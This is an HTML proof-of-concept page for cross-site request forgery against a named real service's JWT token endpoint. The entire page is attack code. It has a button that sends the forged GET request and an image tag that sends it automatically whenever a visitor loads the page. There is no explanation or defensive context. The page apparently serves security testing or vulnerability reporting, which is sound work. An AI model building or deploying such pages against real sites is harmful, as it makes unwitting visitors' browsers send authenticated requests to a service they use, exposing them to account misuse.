<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>CSRF PoC - GET /api/jwt/token</title>
</head>
<body>
  <h2>CSRF PoC - GET Request to /api/jwt/token</h2>

  <p>Click the button below to manually trigger the request:</p>
  <form action="https://www.datacamp.com/api/jwt/token" method="GET" target="_blank">
    <input type="submit" value="Send CSRF GET Request">
  </form>

  <hr>

  <p>Or auto-trigger when the image loads:</p>
  <img src="https://www.datacamp.com/api/jwt/token" alt="CSRF Request">
</body>
</html>
